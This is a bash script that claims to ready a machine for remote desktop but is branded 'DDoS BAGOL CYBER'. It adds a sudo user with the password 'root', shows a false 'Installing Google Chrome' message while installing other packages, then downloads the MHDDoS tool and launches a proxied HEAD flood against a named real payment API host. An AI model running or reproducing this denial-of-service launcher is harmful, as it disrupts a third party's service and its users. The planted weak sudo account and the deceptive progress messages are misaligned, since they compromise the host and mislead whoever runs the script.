#! /bin/bash

# Make Instance Ready for Remote Desktop or RDP

b='\033[1m'
r='\E[31m'
g='\E[32m'
c='\E[36m'
endc='\E[0m'
enda='\033[0m'

clear

# Branding

printf """$c$b

██████╗░██████╗░░█████╗░░██████╗  ██████╗░░█████╗░░██████╗░░█████╗░██╗░░░░░
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░░░░
██║░░██║██║░░██║██║░░██║╚█████╗░  ██████╦╝███████║██║░░██╗░██║░░██║██║░░░░░
██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔══██╗██╔══██║██║░░╚██╗██║░░██║██║░░░░░
██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╦╝██║░░██║╚██████╔╝╚█████╔╝███████╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░╚════╝░╚══════╝

░█████╗░██╗░░░██╗██████╗░███████╗██████╗░
██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗
██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝
██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗
╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║
░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝
    $r BAGOL $c 
$endc$enda""";


# Used Two if else type statements, one is simple second is complex. So, don't get confused or fear by seeing complex if else statement '^^.

# Creation of user
printf "\n\nCreating user " >&2
if sudo useradd -m user &> /dev/null
then
  printf "\ruser created $endc$enda\n" >&2
else
  printf "\r$r$b Error Occured $endc$enda\n" >&2
  exit
fi
# Add user to sudo group
sudo adduser user sudo

# Set password of user to 'root'
echo 'user:root' | sudo chpasswd

# Change default shell from sh to bash
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd

# Initialisation of Installer
printf "\n\n$c$b    Loading Installer $endc$enda" >&2
if sudo apt-get update &> /dev/null
then
    printf "\r$g$b    Installer Loaded $endc$enda\n" >&2
else
    printf "\r$r$b    Error Occured $endc$enda\n" >&2
    exit
fi

# Install Google Chrome
printf "$g$b    Installing Google Chrome $endc$enda" >&2
{
    sudo apt install python -y
    sudo apt install python2 -y
    sudo apt install git -y
} &> /dev/null &&
printf "\r$c$b    Google Chrome Installed $endc$enda\n" >&2 ||
printf "\r$r$b    Error Occured $endc$enda\n" >&2


! git clone https://github.com/MHProDev/MHDDoS.git
! cd MHDDoS
! pip3 install -r requirements.txt
! python3 start.py
! python3 start.py HEAD http://payment-api.paxel.co 1 10000000 proxy.txt 1000 8585
